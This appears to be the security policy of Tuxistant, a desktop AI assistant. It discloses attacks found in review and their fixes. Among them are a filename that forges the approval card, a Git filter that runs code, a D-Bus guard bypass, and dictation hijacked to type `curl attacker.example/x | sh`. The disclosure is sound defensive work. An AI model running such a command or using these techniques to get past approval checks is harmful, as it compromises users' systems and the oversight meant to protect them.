# Security

Tuxistant can read your files, run commands and type into your windows, so it gets attacked before it ships. Reviews try to break each feature, what they find is reproduced, and each attack that matters stays in the test suite.

These are real attacks from building it. What is still open is listed under "Known limits" in [ROADMAP.md](ROADMAP.md).

## Reporting a problem

Please [report it privately](https://github.com/BuenGenio/Tuxistant/security/advisories/new) rather than in a public issue.

## How it is meant to hold

- A risky action needs a click on a card. A voice "yes" never counts, because audio playing nearby could say it.
- The text on a card comes from the daemon looking at the real action, never from a model or a skill.
- After private data has been read, nothing leaves your own server without a click.
- The model can be made to emit any tool call, so the parser, the sandbox and the card have to hold on their own.

## Attacks

### The file name that forges the approval card

An attacker names a file `a.tmp`, then a line break, then `only-this-harmless-file.tmp`. When you ask to delete `*.tmp`, the card looks as if it lists one harmless file, while the real list is hidden.

Tuxistant shows line breaks, tabs, escape codes and text-direction characters as visible codes, so a name can't draw its own line.

### The repository that runs code when you look at it

A downloaded Git repository can name a "filter" program in its own config, and plain `git status` will run it.

Tuxistant runs Git with hooks and filters turned off. Each attack in the test suite is first shown working on ordinary Git in the same sandbox, so a pass proves the defence stopped it.

### Getting past the guard by leaving something out

Only GNOME Shell may answer an approval card, and the first guard checked the D-Bus interface name. A call can leave the interface out and still reach the method, which bypassed the check.

The guard now matches on the method name alone.

### The redirect that steals your key

A server answers with a redirect to another host, hoping the API key follows.

Tuxistant refuses redirects and ignores proxies. In the test, the second host receives nothing.

### Choosing the words you dictate

Another program on your desktop pointed Tuxistant at its own server, then started dictation. Its server received the audio and chose the text, so `curl attacker.example/x | sh` appeared in the terminal. Dictation can never press Enter, so the command didn't run.

Now only the shell can start dictation, and the words go to the shell alone rather than across the session bus. This isn't fully closed: a program running as you can still change the server setting, so it could still choose the words of a dictation you start yourself. It can't start one or press Enter.

### Your password, pasted into the wrong app

Some apps need a paste, so Tuxistant borrows the clipboard and puts it back after a moment. The review used an app that took 1.2 seconds to respond. By then the clipboard had been restored, and the app received `my-bank-password` instead of the dictated words.

The wait is now 2 seconds, and that app gets the words. The wait is still fixed, so an app slower than that could still get the old clipboard.

## When the checks themselves failed

### The test result that proved nothing

A check that breaks each safety guard on purpose reported 18 of 18 caught. Every test had actually died at import, so nothing had been tested.

The check now refuses to run unless the same tests pass with nothing broken first.

### The fix that crashed the desktop

Fixing a clipboard bug introduced a worse one: code held on to memory it didn't own, and GNOME Shell crashed. On Wayland that ends your whole session.

It was caught in an isolated test shell, and the rule is now in [CONTRACT.md](CONTRACT.md).
